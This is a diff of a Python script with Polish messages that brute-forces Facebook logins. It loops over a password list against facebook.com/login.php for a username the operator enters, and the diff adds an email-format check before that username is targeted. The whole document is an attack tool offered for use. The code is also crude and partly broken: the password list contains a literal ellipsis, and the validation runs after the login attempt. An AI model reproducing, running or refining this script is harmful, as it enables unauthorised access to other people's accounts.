@@ -1,5 +1,6 @@
 import requests
 import time
+import re
 
 def brute_force(username, password):
     url = "https://www.facebook.com/login.php"
@@ -14,11 +15,15 @@ def brute_force(username, password):
         print("Błąd podczas logowania. Kod odpowiedzi:", response.status_code)
         return False
 
+    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z]+$', username):
+        print("Niepoprawna nazwa użytkownika.")
+        return False
+
     print("Znaleziono hasło:", password)
     return True
 
 def main():
-    username = "example@example.com"
+    username = input("Podaj nazwę użytkownika: ")
     password_list = ["hasło1", "hasło2", "hasło3", ...]
 
     for password in password_list:
@@ -30,4 +35,5 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
